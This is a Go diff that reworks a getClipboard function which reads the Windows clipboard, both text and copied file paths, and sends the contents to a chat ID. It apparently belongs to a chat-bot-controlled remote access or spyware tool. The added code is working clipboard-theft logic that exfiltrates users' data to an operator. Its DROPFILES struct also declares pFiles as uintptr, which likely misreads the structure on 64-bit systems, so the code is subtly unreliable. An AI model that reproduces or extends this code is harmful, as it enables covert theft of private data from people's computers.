@@ -3,57 +3,97 @@
 package main
 
 import (
-	"syscall"
+	"fmt"
+	"strings"
 	"unsafe"
+
+	"golang.org/x/sys/windows"
 )
 
+const (
+	CF_UNICODETEXT = 13
+	CF_HDROP       = 15
+)
+
+type DROPFILES struct {
+	pFiles uintptr
+	pt     POINT
+	fNC    int32
+	fWide  int32
+}
+
+type POINT struct {
+	X, Y int32
+}
+
 func getClipboard(chatID int64) {
-
-	// Will hold the clipboard data
-	responseStr := "-"
-
-	// Some temp variables
-	var n int = 0
-	var data []uint16
-	var ptr uintptr
-	var h uintptr
+	var responseStr string
 
 	// Open the clipboard
 	ret, _, _ := openClipboard.Call(0)
 	if ret == 0 {
-		responseStr = "Error OpenClipboard()"
-		goto close_and_send
+		SendMessage(chatID, "Could not open clipboard")
+		return
 	}
+	defer closeClipboard.Call()
 
-	// Get the clipboard data
-	h, _, _ = getClipboardData.Call(uintptr(CF_UNICODETEXT))
-	if h == 0 {
-		responseStr = "Error GetClipboardData()"
-		goto close_and_send
-	}
-
-	// Lock the handle to get a pointer to the data
-	ptr, _, _ = globalLock.Call(h)
-	if ptr == 0 {
-		goto close_and_send
-	}
-	defer globalUnlock.Call(h)
-
-	// Create a slice from the pointer
-	data = (*[1 << 20]uint16)(unsafe.Pointer(ptr))[:]
-
-	// Find the null terminator
-	for i, v := range data {
-		if v == 0 {
-			n = i
-			break
+	// Try to get text data
+	h, _, _ := getClipboardData.Call(uintptr(CF_UNICODETEXT))
+	if h != 0 {
+		responseStr = getTextFromHandle(h)
+		if responseStr != "" {
+			SendMessage(chatID, responseStr)
+			return
 		}
 	}
 
-	responseStr = syscall.UTF16ToString(data[:n])
+	// If text data failed, try to get file paths
+	h, _, _ = getClipboardData.Call(uintptr(CF_HDROP))
+	if h != 0 {
+		responseStr = getFilePathsFromHandle(h)
+		if responseStr != "" {
+			SendMessage(chatID, responseStr)
+			return
+		}
+	}
 
-close_and_send:
-	closeClipboard.Call()
-	SendMessage(chatID, responseStr)
+	SendMessage(chatID, "Could not retrieve clipboard data")
+}
 
+func getTextFromHandle(h uintptr) string {
+	ptr, _, _ := globalLock.Call(h)
+	if ptr == 0 {
+		return ""
+	}
+	defer globalUnlock.Call(h)
+
+	return windows.UTF16PtrToString((*uint16)(unsafe.Pointer(ptr)))
+}
+
+func getFilePathsFromHandle(h uintptr) string {
+	ptr, _, _ := globalLock.Call(h)
+	if ptr == 0 {
+		return ""
+	}
+	defer globalUnlock.Call(h)
+
+	dropFiles := (*DROPFILES)(unsafe.Pointer(ptr))
+	if dropFiles.fWide == 0 {
+		return "ANSI paths not supported"
+	}
+
+	// Get the pointer to the file list
+	fileListPtr := uintptr(ptr) + uintptr(dropFiles.pFiles)
+
+	var filePaths []string
+	for {
+		filePath := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(fileListPtr)))
+		if filePath == "" {
+			break
+		}
+		filePaths = append(filePaths, filePath)
+		fileListPtr += uintptr(2 * (len(filePath) + 1)) // Move to the next file path
+	}
+
+	return fmt.Sprintf("Copied files:\n%s", strings.Join(filePaths, "\n"))
 }
